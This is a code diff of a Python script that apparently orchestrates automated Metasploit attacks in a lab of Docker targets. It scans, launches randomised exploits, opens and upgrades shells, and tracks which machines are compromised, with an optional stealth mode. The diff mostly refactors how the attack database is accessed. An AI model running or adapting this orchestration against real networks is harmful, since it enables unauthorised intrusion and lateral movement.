@@ -3,7 +3,7 @@ import random
 import ipaddress
 from MetaClient import MetaClient
 from util import Logger,Constants as C
-from attack import Attack,Metasploit_Attack,ResourceAttack,SshAttack,AttackDB
+from attack import Attack,Metasploit_Attack,ResourceAttack,SshAttack,Attack_DB
 from time import sleep
 
 
@@ -11,7 +11,6 @@ from time import sleep
 def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
     Logger.init_logger()
-    
 
     with open(config_file) as f:
         target_list=json.load(f)
@@ -27,7 +26,6 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     atk_sess=None
     compromised_machines={attacker_ip}
     uncompromised_machines=set(machines)
-    attackDB = AttackDB()
 
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
 
@@ -36,9 +34,8 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         target_ip=machines.pop(0)
         print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
 
-        
-        attacks= list(attackDB.attack_dict.values())
-        randomized_attack=random.sample(attacks,len(attacks))
+        attack=list(Attack_DB.attack_dict)
+        randomized_attack=random.sample(attack,len(attack))
 
         if(atk_sess!=None):
             met_sess=mc.upgrade_shell(atk_sess)
@@ -64,7 +61,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             scans=list(Attack_DB.stealth_scans_dict)
         else:
             scans=list(Attack_DB.scans_dict)
-c
+
         s=random.choice(scans)
         
         if(s != "tcp_portscan"):
@@ -82,22 +79,22 @@ c
         mc.attempt_scan(scan_obj)
         """
 
-        for attack_obj in randomized_attack:
+        for ra in randomized_attack:
 
             LPORT = C.DEFAULT_LPORT  #PENTESTER LISTENING PORT
-            attack_name=attack_obj.name
+            attack_name=Attack_DB.attack_dict[ra].attack
             for p in C.TARGETS_DOCKERS[target_ip]:
                 if(attack_name in p["attack_list"]):
                     LPORT=p["exposed_port"]
                     break
         
             #format the string with the ip that need to be used
-            attack_instr=attack_obj.instructions.format(target_ip,attacker_ip,LPORT=LPORT)
-            attack_type=attack_obj.__class__.__name__
-            attack_wait=attack_obj.wait_time
+            attack_instr=Attack_DB.attack_dict[ra].instruction.format(target_ip,attacker_ip,LPORT=LPORT)
+            attack_type=Attack_DB.attack_dict[ra].attack_type
+            attack_wait=Attack_DB.attack_dict[ra].wait_time
 
             print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
-            """
+            
             if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
                 print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
@@ -105,7 +102,7 @@ c
             if(attack_name=="smtp_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="smtp_server"):
                 print(f"{C.COL_RED}[-] Special attack smtp_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
-                """
+                
             if(attack_type=="ResourceAttack"):
                 attack_obj=ResourceAttack(attack_name,attack_instr,attack_wait, mc)
             elif(attack_type=="SshAttack"):
